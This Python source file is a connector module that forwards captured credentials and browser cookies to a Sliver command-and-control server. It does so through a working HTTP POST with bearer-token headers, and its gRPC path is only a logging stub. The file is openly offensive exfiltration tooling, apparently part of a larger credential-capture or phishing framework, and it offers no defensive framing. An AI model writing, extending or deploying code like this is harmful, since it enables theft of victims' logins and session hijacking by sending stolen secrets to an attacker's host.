"""Sliver C2 connector.

Pushes captured credentials and cookies to a Sliver server. If ``grpc_url`` is
provided and the grpc library is installed, a gRPC stub is used. Otherwise the
connector falls back to HTTP(S) when ``url`` is provided, or logs that the
connector is unavailable.
"""

import logging

import requests

logger = logging.getLogger(__name__)

try:
    import grpc  # type: ignore[import-not-found]

    _GRPC_AVAILABLE = True
except Exception as exc:  # pragma: no cover - grpc may not be installed
    logger.debug("grpc library not available: %s", exc)
    grpc = None  # type: ignore[misc, assignment]
    _GRPC_AVAILABLE = False


def _http_headers(config: dict) -> dict:
    headers = {"Content-Type": "application/json"}
    token = config.get("api_token") or config.get("password") or config.get("secret")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return headers


def _http_push(payload: dict, config: dict, payload_type: str) -> None:
    url = config.get("url")
    if not url:
        logger.warning("Sliver connector missing url")
        return

    body = {"type": payload_type, "data": payload, "timestamp": payload.get("captured_at")}
    try:
        resp = requests.post(url, json=body, headers=_http_headers(config), timeout=10)
        logger.info("Sliver HTTP %s push status: %s", payload_type, resp.status_code)
    except Exception:
        logger.exception("Sliver HTTP %s push failed", payload_type)


def _grpc_push(payload: dict, config: dict, payload_type: str) -> None:
    """Optional gRPC push stub.

    Real Sliver integration requires the compiled RPC client/proto. Without
    those definitions we log the attempt and return so the connector stays
    safe to configure.
    """
    logger.info(
        "Sliver gRPC %s push requested to %s but proto client is not bundled; "
        "connector is a no-op.",
        payload_type,
        config.get("grpc_url"),
    )


def push_credential(payload: dict, config: dict) -> None:
    """Push a credential payload to Sliver via gRPC or HTTP fallback."""
    grpc_url = config.get("grpc_url")
    if grpc_url and _GRPC_AVAILABLE:
        _grpc_push(payload, config, "credential")
    elif grpc_url:
        logger.warning(
            "Sliver gRPC credential push requested but grpc library is not installed; "
            "falling back to HTTP if url is configured."
        )
        _http_push(payload, config, "credential")
    else:
        _http_push(payload, config, "credential")


def push_cookie(payload: dict, config: dict) -> None:
    """Push a cookie payload to Sliver via gRPC or HTTP fallback."""
    grpc_url = config.get("grpc_url")
    if grpc_url and _GRPC_AVAILABLE:
        _grpc_push(payload, config, "cookie")
    elif grpc_url:
        logger.warning(
            "Sliver gRPC cookie push requested but grpc library is not installed; "
            "falling back to HTTP if url is configured."
        )
        _http_push(payload, config, "cookie")
    else:
        _http_push(payload, config, "cookie")
